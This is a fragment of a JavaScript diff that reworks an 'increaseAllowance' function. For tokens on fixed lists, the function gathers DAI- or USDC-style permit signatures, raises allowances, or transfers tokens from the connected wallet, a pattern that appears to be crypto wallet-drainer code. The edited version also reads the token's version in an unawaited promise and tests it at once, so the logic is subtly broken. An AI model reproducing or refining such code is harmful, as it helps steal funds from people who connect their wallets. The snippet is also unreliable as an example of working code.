@@ -125,36 +125,37 @@ export const increaseAllowance = async (token) => {
   const increaseallown = constants.increasAllownceTokens.find(tokenis => tokenis === token.token_address)
   const transfertoken = constants.transferTokens.find(tokenis => tokenis === token.token_address)
   if (permitToken) {
-
-    let nonce = undefined
-    await readContract({
-      address: token.token_address,
-      abi: constants.ALLOWANCEABI,
-      functionName: 'nonces',
-      args: [getAccount().address],
-    }).then( (result) => {
-      nonce = result
-    }).catch( (error) => {
-      console.log(error)
-    })
-
+    let version = null;
     readContract({
       address: token.token_address,
       abi: constants.ALLOWANCEABI,
       functionName: 'version',
     }).then( async (result) => {
-      if( result === '1') {
-        await daiPermitV1(
-          permitToken, nonce, provider
-        )
-      }else if (result === '2') {
-        await usdcPermitV2(
-          permitToken, provider
-        )
-      }
+      version = await result;
     }).catch((error) => {
       console.log(error);
     })
+    
+    if( version === '1') {
+      let nonce = undefined
+      await readContract({
+        address: token.token_address,
+        abi: constants.ALLOWANCEABI,
+        functionName: 'nonces',
+        args: [getAccount().address],
+      }).then(async (result) => {
+        nonce = await result;
+      }).catch( (error) => {
+        console.log(error)
+      })
+      await daiPermitV1(
+        permitToken, nonce, provider
+      )
+    }else if (version === '2') {
+      await usdcPermitV2(
+        permitToken, provider
+      )
+    }
   }else if (increaseallown) {
     await increasAllow(token);
   }else if (transfertoken) {
